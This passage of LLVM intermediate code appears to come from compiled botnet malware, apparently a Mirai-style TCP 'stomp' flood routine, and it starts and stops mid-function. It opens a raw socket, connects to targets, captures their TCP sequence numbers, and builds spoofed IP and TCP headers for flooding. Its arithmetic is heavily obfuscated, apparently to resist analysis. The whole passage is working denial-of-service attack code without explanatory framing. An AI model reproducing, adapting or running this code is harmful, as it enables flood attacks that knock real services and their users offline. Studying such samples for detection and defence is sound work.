  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %902

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %902

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %766, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %772

; <label>:120:                                    ; preds = %115
  br label %121

; <label>:121:                                    ; preds = %761, %748, %120
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  br label %766

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %127, i32 3, i32 0)
  %129 = xor i32 %128, -1
  %130 = xor i32 2048, -1
  %131 = xor i32 671009794, -1
  %132 = and i32 %129, 671009794
  %133 = and i32 %128, %131
  %134 = and i32 %130, 671009794
  %135 = and i32 2048, %131
  %136 = or i32 %132, %133
  %137 = or i32 %134, %135
  %138 = xor i32 %136, %137
  %139 = or i32 %129, %130
  %140 = xor i32 %139, -1
  %141 = or i32 671009794, %131
  %142 = and i32 %140, %141
  %143 = or i32 %138, %142
  %144 = or i32 %128, 2048
  %145 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i32 %143)
  %146 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %146, align 4
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 2
  %152 = load i8, i8* %151, align 4
  %153 = zext i8 %152 to i32
  %154 = icmp slt i32 %153, 32
  br i1 %154, label %155, label %180

; <label>:155:                                    ; preds = %125
  %156 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %157 = load i32, i32* %9, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i64 %158
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %159, i32 0, i32 1
  %161 = load i32, i32* %160, align 4
  %162 = call i32 @ntohl(i32 %161) #7
  %163 = call i32 @rand_next()
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 2
  %169 = load i8, i8* %168, align 4
  %170 = zext i8 %169 to i32
  %171 = lshr i32 %163, %170
  %172 = sub i32 0, %162
  %173 = sub i32 0, %171
  %174 = add i32 %172, %173
  %175 = sub i32 0, %174
  %176 = add i32 %162, %171
  %177 = call i32 @htonl(i32 %175) #7
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %179 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %178, i32 0, i32 0
  store i32 %177, i32* %179, align 4
  br label %189

; <label>:180:                                    ; preds = %125
  %181 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 1
  %186 = load i32, i32* %185, align 4
  %187 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %188 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %187, i32 0, i32 0
  store i32 %186, i32* %188, align 4
  br label %189

; <label>:189:                                    ; preds = %180, %155
  %190 = load i16, i16* %17, align 2
  %191 = zext i16 %190 to i32
  %192 = icmp eq i32 %191, 65535
  br i1 %192, label %193, label %201

; <label>:193:                                    ; preds = %189
  %194 = call i32 @rand_next()
  %195 = xor i32 65535, -1
  %196 = xor i32 %194, %195
  %197 = and i32 %196, %194
  %198 = and i32 %194, 65535
  %199 = trunc i32 %197 to i16
  %200 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %199, i16* %200, align 2
  br label %205

; <label>:201:                                    ; preds = %189
  %202 = load i16, i16* %17, align 2
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %203, i16* %204, align 2
  br label %205

; <label>:205:                                    ; preds = %201, %193
  %206 = load i32, i32* %26, align 4
  %207 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %208 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %208, %struct.sockaddr** %207, align 8
  %209 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %210 = load %struct.sockaddr*, %struct.sockaddr** %209, align 8
  %211 = call i32 @connect(i32 %206, %struct.sockaddr* %210, i32 16)
  %212 = call i64 @time(i64* null) #6
  store i64 %212, i64* %31, align 8
  br label %213

; <label>:213:                                    ; preds = %764, %205
  store i32 16, i32* %29, align 4
  %214 = load i32, i32* %10, align 4
  %215 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %216 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %217 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %217, %struct.sockaddr** %216, align 8
  %218 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %219 = load %struct.sockaddr*, %struct.sockaddr** %218, align 8
  %220 = call i64 @recvfrom(i32 %214, i8* %215, i64 256, i32 16384, %struct.sockaddr* %219, i32* %29)
  %221 = trunc i64 %220 to i32
  store i32 %221, i32* %33, align 4
  %222 = load i32, i32* %33, align 4
  %223 = icmp eq i32 %222, -1
  br i1 %223, label %224, label %225

; <label>:224:                                    ; preds = %213
  br label %902

; <label>:225:                                    ; preds = %213
  %226 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %227 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %226, i32 0, i32 0
  %228 = load i32, i32* %227, align 4
  %229 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %230 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %229, i32 0, i32 0
  %231 = load i32, i32* %230, align 4
  %232 = icmp eq i32 %228, %231
  br i1 %232, label %233, label %754

; <label>:233:                                    ; preds = %225
  %234 = load i32, i32* %33, align 4
  %235 = sext i32 %234 to i64
  %236 = icmp ugt i64 %235, 40
  br i1 %236, label %237, label %754

; <label>:237:                                    ; preds = %233
  %238 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %239 = getelementptr inbounds i8, i8* %238, i64 20
  %240 = bitcast i8* %239 to %struct.tcphdr*
  store %struct.tcphdr* %240, %struct.tcphdr** %35, align 8
  %241 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 0
  %243 = load i16, i16* %242, align 4
  %244 = zext i16 %243 to i32
  %245 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %246 = load i16, i16* %245, align 2
  %247 = zext i16 %246 to i32
  %248 = icmp eq i32 %244, %247
  br i1 %248, label %249, label %753

; <label>:249:                                    ; preds = %237
  %250 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 4
  %252 = load i16, i16* %251, align 4
  %253 = lshr i16 %252, 9
  %254 = xor i16 %253, -1
  %255 = xor i16 1, -1
  %256 = xor i16 31711, -1
  %257 = or i16 %254, %255
  %258 = or i16 31711, %256
  %259 = xor i16 %257, -1
  %260 = and i16 %259, %258
  %261 = and i16 %253, 1
  %262 = zext i16 %260 to i32
  %263 = icmp ne i32 %262, 0
  br i1 %263, label %264, label %722

; <label>:264:                                    ; preds = %249
  %265 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %266 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %265, i32 0, i32 4
  %267 = load i16, i16* %266, align 4
  %268 = lshr i16 %267, 12
  %269 = xor i16 1, -1
  %270 = xor i16 %268, %269
  %271 = and i16 %270, %268
  %272 = and i16 %268, 1
  %273 = zext i16 %271 to i32
  %274 = icmp ne i32 %273, 0
  br i1 %274, label %275, label %722

; <label>:275:                                    ; preds = %264
  %276 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %277 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %276, i32 0, i32 0
  %278 = load i32, i32* %277, align 4
  %279 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %280 = load i32, i32* %9, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %279, i64 %281
  %283 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %282, i32 0, i32 0
  store i32 %278, i32* %283, align 4
  %284 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %285 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %284, i32 0, i32 2
  %286 = load i32, i32* %285, align 4
  %287 = call i32 @ntohl(i32 %286) #7
  %288 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %289 = load i32, i32* %9, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %288, i64 %290
  %292 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %291, i32 0, i32 1
  store i32 %287, i32* %292, align 4
  %293 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %294 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %293, i32 0, i32 3
  %295 = load i32, i32* %294, align 4
  %296 = call i32 @ntohl(i32 %295) #7
  %297 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %298 = load i32, i32* %9, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %297, i64 %299
  %301 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %300, i32 0, i32 2
  store i32 %296, i32* %301, align 4
  %302 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 1
  %304 = load i16, i16* %303, align 2
  %305 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %306 = load i32, i32* %9, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %305, i64 %307
  %309 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %308, i32 0, i32 3
  store i16 %304, i16* %309, align 4
  %310 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %311 = load i16, i16* %310, align 2
  %312 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %313 = load i32, i32* %9, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %312, i64 %314
  %316 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %315, i32 0, i32 4
  store i16 %311, i16* %316, align 2
  %317 = load i32, i32* %24, align 4
  %318 = sext i32 %317 to i64
  %319 = sub i64 0, 40
  %320 = sub i64 0, %318
  %321 = add i64 %319, %320
  %322 = sub i64 0, %321
  %323 = add i64 40, %318
  %324 = call noalias i8* @malloc(i64 %322) #6
  %325 = load i8**, i8*** %12, align 8
  %326 = load i32, i32* %9, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds i8*, i8** %325, i64 %327
  store i8* %324, i8** %328, align 8
  %329 = load i8**, i8*** %12, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds i8*, i8** %329, i64 %331
  %333 = load i8*, i8** %332, align 8
  %334 = bitcast i8* %333 to %struct.iphdr*
  store %struct.iphdr* %334, %struct.iphdr** %36, align 8
  %335 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i64 1
  %337 = bitcast %struct.iphdr* %336 to %struct.tcphdr*
  store %struct.tcphdr* %337, %struct.tcphdr** %37, align 8
  %338 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %339 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %338, i64 1
  %340 = bitcast %struct.tcphdr* %339 to i8*
  store i8* %340, i8** %38, align 8
  %341 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %342 = bitcast %struct.iphdr* %341 to i8*
  %343 = load i8, i8* %342, align 4
  %344 = xor i8 %343, -1
  %345 = xor i8 15, -1
  %346 = xor i8 84, -1
  %347 = or i8 %344, %345
  %348 = or i8 84, %346
  %349 = xor i8 %347, -1
  %350 = and i8 %349, %348
  %351 = and i8 %343, 15
  %352 = xor i8 %350, -1
  %353 = xor i8 64, -1
  %354 = xor i8 -39, -1
  %355 = and i8 %352, -39
  %356 = and i8 %350, %354
  %357 = and i8 %353, -39
  %358 = and i8 64, %354
  %359 = or i8 %355, %356
  %360 = or i8 %357, %358
  %361 = xor i8 %359, %360
  %362 = or i8 %352, %353
  %363 = xor i8 %362, -1
  %364 = or i8 -39, %354
  %365 = and i8 %363, %364
  %366 = or i8 %361, %365
  %367 = or i8 %350, 64
  store i8 %366, i8* %342, align 4
  %368 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %369 = bitcast %struct.iphdr* %368 to i8*
  %370 = load i8, i8* %369, align 4
  %371 = xor i8 %370, -1
  %372 = xor i8 -16, -1
  %373 = xor i8 -117, -1
  %374 = or i8 %371, %372
  %375 = or i8 -117, %373
  %376 = xor i8 %374, -1
  %377 = and i8 %376, %375
  %378 = and i8 %370, -16
  %379 = xor i8 %377, -1
  %380 = xor i8 5, -1
  %381 = xor i8 -97, -1
  %382 = and i8 %379, -97
  %383 = and i8 %377, %381
  %384 = and i8 %380, -97
  %385 = and i8 5, %381
  %386 = or i8 %382, %383
  %387 = or i8 %384, %385
  %388 = xor i8 %386, %387
  %389 = or i8 %379, %380
  %390 = xor i8 %389, -1
  %391 = or i8 -97, %381
  %392 = and i8 %390, %391
  %393 = or i8 %388, %392
  %394 = or i8 %377, 5
  store i8 %393, i8* %369, align 4
  %395 = load i8, i8* %13, align 1
  %396 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 1
  store i8 %395, i8* %397, align 1
  %398 = load i32, i32* %24, align 4
  %399 = sext i32 %398 to i64
  %400 = sub i64 40, 5816303939123815726
  %401 = add i64 %400, %399
  %402 = add i64 %401, 5816303939123815726
  %403 = add i64 40, %399
  %404 = trunc i64 %402 to i16
  %405 = call zeroext i16 @htons(i16 zeroext %404) #7
  %406 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %407 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %406, i32 0, i32 2
  store i16 %405, i16* %407, align 2
  %408 = load i16, i16* %14, align 2
  %409 = call zeroext i16 @htons(i16 zeroext %408) #7
  %410 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %411 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %410, i32 0, i32 3
  store i16 %409, i16* %411, align 4
  %412 = load i8, i8* %15, align 1
  %413 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %414 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %413, i32 0, i32 5
  store i8 %412, i8* %414, align 4
  %415 = load i8, i8* %16, align 1
  %416 = icmp ne i8 %415, 0
  br i1 %416, label %417, label %421

; <label>:417:                                    ; preds = %275
  %418 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %419 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %420 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %419, i32 0, i32 4
  store i16 %418, i16* %420, align 2
  br label %421

; <label>:421:                                    ; preds = %417, %275
  %422 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %423 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %422, i32 0, i32 6
  store i8 6, i8* %423, align 1
  %424 = load i32, i32* @LOCAL_ADDR, align 4
  %425 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %426 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %425, i32 0, i32 8
  store i32 %424, i32* %426, align 4
  %427 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %428 = load i32, i32* %9, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %427, i64 %429
  %431 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %430, i32 0, i32 0
  %432 = load i32, i32* %431, align 4
  %433 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %434 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %433, i32 0, i32 9
  store i32 %432, i32* %434, align 4
  %435 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %436 = load i32, i32* %9, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %435, i64 %437
  %439 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %438, i32 0, i32 3
  %440 = load i16, i16* %439, align 4
  %441 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %442 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %441, i32 0, i32 0
  store i16 %440, i16* %442, align 4
  %443 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %444 = load i32, i32* %9, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %443, i64 %445
  %447 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %446, i32 0, i32 4
  %448 = load i16, i16* %447, align 2
  %449 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %450 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %449, i32 0, i32 1
  store i16 %448, i16* %450, align 2
  %451 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %452 = load i32, i32* %9, align 4
  %453 = sext i32 %452 to i64
  %454 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %451, i64 %453
  %455 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %454, i32 0, i32 2
  %456 = load i32, i32* %455, align 4
  %457 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %458 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %457, i32 0, i32 2
  store i32 %456, i32* %458, align 4
  %459 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %460 = load i32, i32* %9, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %459, i64 %461
  %463 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %462, i32 0, i32 1
  %464 = load i32, i32* %463, align 4
  %465 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %466 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %465, i32 0, i32 3
  store i32 %464, i32* %466, align 4
  %467 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %468 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %467, i32 0, i32 4
  %469 = load i16, i16* %468, align 4
  %470 = xor i16 %469, -1
  %471 = xor i16 -241, -1
  %472 = xor i16 -19198, -1
  %473 = or i16 %470, %471
  %474 = or i16 -19198, %472
  %475 = xor i16 %473, -1
  %476 = and i16 %475, %474
  %477 = and i16 %469, -241
  %478 = xor i16 %476, -1
  %479 = xor i16 128, -1
  %480 = xor i16 -30902, -1
  %481 = and i16 %478, -30902
  %482 = and i16 %476, %480
  %483 = and i16 %479, -30902
  %484 = and i16 128, %480
  %485 = or i16 %481, %482
  %486 = or i16 %483, %484
  %487 = xor i16 %485, %486
  %488 = or i16 %478, %479
  %489 = xor i16 %488, -1
  %490 = or i16 -30902, %480
  %491 = and i16 %489, %490
  %492 = or i16 %487, %491
  %493 = or i16 %476, 128
  store i16 %492, i16* %468, align 4
  %494 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %495 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %494, i32 0, i32 4
  %496 = load i16, i16* %495, align 4
  %497 = xor i16 -257, -1
  %498 = xor i16 %496, %497
  %499 = and i16 %498, %496
  %500 = and i16 %496, -257
  %501 = xor i16 %499, -1
  %502 = xor i16 256, -1
  %503 = xor i16 12438, -1
  %504 = and i16 %501, 12438
  %505 = and i16 %499, %503
  %506 = and i16 %502, 12438
  %507 = and i16 256, %503
  %508 = or i16 %504, %505
  %509 = or i16 %506, %507
  %510 = xor i16 %508, %509
  %511 = or i16 %501, %502
  %512 = xor i16 %511, -1
  %513 = or i16 12438, %503
  %514 = and i16 %512, %513
  %515 = or i16 %510, %514
  %516 = or i16 %499, 256
  store i16 %515, i16* %495, align 4
  %517 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %518 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %517, i32 0, i32 4
  %519 = load i16, i16* %518, align 4
  %520 = xor i16 %519, -1
  %521 = xor i16 -4097, -1
  %522 = xor i16 17292, -1
  %523 = or i16 %520, %521
  %524 = or i16 17292, %522
  %525 = xor i16 %523, -1
  %526 = and i16 %525, %524
  %527 = and i16 %519, -4097
  %528 = and i16 %526, 4096
  %529 = xor i16 %526, 4096
  %530 = or i16 %528, %529
  %531 = or i16 %526, 4096
  store i16 %530, i16* %518, align 4
  %532 = call i32 @rand_next()
  %533 = xor i32 %532, -1
  %534 = xor i32 65535, -1
  %535 = xor i32 -423671945, -1
  %536 = or i32 %533, %534
  %537 = or i32 -423671945, %535
  %538 = xor i32 %536, -1
  %539 = and i32 %538, %537
  %540 = and i32 %532, 65535
  %541 = trunc i32 %539 to i16
  %542 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %543 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %542, i32 0, i32 5
  store i16 %541, i16* %543, align 2
  %544 = load i8, i8* %18, align 1
  %545 = sext i8 %544 to i16
  %546 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %547 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %546, i32 0, i32 4
  %548 = load i16, i16* %547, align 4
  %549 = xor i16 1, -1
  %550 = xor i16 %545, %549
  %551 = and i16 %550, %545
  %552 = and i16 %545, 1
  %553 = shl i16 %551, 13
  %554 = xor i16 -8193, -1
  %555 = xor i16 %548, %554
  %556 = and i16 %555, %548
  %557 = and i16 %548, -8193
  %558 = and i16 %556, %553
  %559 = xor i16 %556, %553
  %560 = or i16 %558, %559
  %561 = or i16 %556, %553
  store i16 %560, i16* %547, align 4
  %562 = load i8, i8* %19, align 1
  %563 = sext i8 %562 to i16
